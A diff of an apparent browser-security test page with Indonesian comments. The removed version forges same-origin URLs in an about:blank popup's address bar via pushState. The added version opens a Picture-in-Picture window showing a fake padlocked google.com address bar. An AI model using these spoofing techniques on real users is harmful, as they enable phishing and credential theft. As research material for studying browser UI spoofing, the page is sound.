@@ -1,34 +1,17 @@
-<!-- 27 | ⭐ pushState di popup about:blank — bar menulis URL untuk dokumen yang tak pernah dimuat | [1-CLICK]
-     Ini primitif, bukan bug — dan justru karena primitif ia berguna sebagai fondasi.
-     window.open('') melahirkan dokumen yang MEWARISI origin pembukanya. Karena origin-nya
-     sama, history.pushState DIIZINKAN di sana. Jadi kita bisa menulis URL apa pun (dalam
-     origin kita) ke bar sebuah dokumen yang isinya kita tulis sendiri dgn document.write,
-     dan yang TIDAK PERNAH dimuat dari server mana pun.
-     Hasilnya: bar menulis alamat yang terlihat sah dan spesifik (mis. /account/verify),
-     konten sepenuhnya milik penyerang, nol request ke jaringan, nol jejak di server.
-     Batasnya jujur: masih origin SENDIRI, jadi ini belum lintas-origin. Nilainya muncul saat
-     digabung — origin ini di-host di tempat yang namanya menyamar, atau dipakai sbg
-     tahap pertama untuk 13/15/16.
-     EXPECTED-SECURE  tidak ada; ini memang perilaku spesifikasi. Yang diuji adalah SEBERAPA
-     JAUH URL bisa dibentuk sebelum browser menolaknya — itu yang dicetak di bawah. -->
-<button onclick="go()">Run 27</button>
-<input id=p value="/account/verify?session=ok" style="width:280px;font:13px monospace">
-<pre id=g style="font:12px/1.7 monospace"></pre>
+<!doctype html><meta charset=utf-8>
+<button onclick="go()">buka PiP</button>
+<pre id=p></pre>
 <script>
-g.textContent = 'REAL ORIGIN: ' + location.href;
-function go() {
-  var w = window.open('', '', 'width=820,height=520');
-  if (!w) { g.textContent = 'popup diblokir.'; return; }
-  w.document.write('<div style="font:15px system-ui;padding:16px"><b>Konten ini ditulis penyerang.</b>' +
-    '<p style="font:12px monospace">nol request jaringan · nol jejak server</p></div>');
-  var res = [];
-  [p.value.trim(), '/'.repeat(6) + 'x', '/a?b=' + 'y'.repeat(300), '/#' + 'z'.repeat(300)].forEach(function (u) {
-    try { w.history.pushState({}, '', u); res.push('OK      ' + u.slice(0, 60)); }
-    catch (e) { res.push('DITOLAK ' + e.name + '  ' + u.slice(0, 40)); }
-  });
-  try { w.history.pushState({}, '', 'https://www.google.com/'); res.push('OK      lintas-origin (!!) — ini akan jadi temuan besar'); }
-  catch (e) { res.push('DITOLAK lintas-origin -> ' + e.name + '  (benar, sesuai spesifikasi)'); }
-  g.textContent = 'REAL ORIGIN: ' + location.origin + '\n\n' + res.join('\n') +
-    '\n\nBaca bar popup: ia menulis URL terakhir yang OK, untuk dokumen yang tak pernah dimuat.';
+async function go(){
+  if (!self.documentPictureInPicture) return p.textContent += '\nPiP API tidak ada di browser ini.';
+  const w = await documentPictureInPicture.requestWindow({ width: 520, height: 300 });
+  w.document.body.style.margin = 0;
+  w.document.body.innerHTML =
+    '<div style="height:34px;background:#dee1e6;font:13px system-ui;display:flex;align-items:center;padding:0 10px">'
+    + '<span style="background:#fff;border-radius:16px;padding:4px 12px;flex:1">&#128274; https://www.google.com/</span></div>'
+    + '<div style="padding:14px;font:14px system-ui"><b>Jendela ini tidak punya address bar.</b>'
+    + '<pre>REAL opener: ' + location.href + '</pre></div>';
+  p.textContent += '\nPiP terbuka: always-on-top, nol atribusi origin';
 }
+p.textContent = 'REAL: ' + location.href;
 </script>
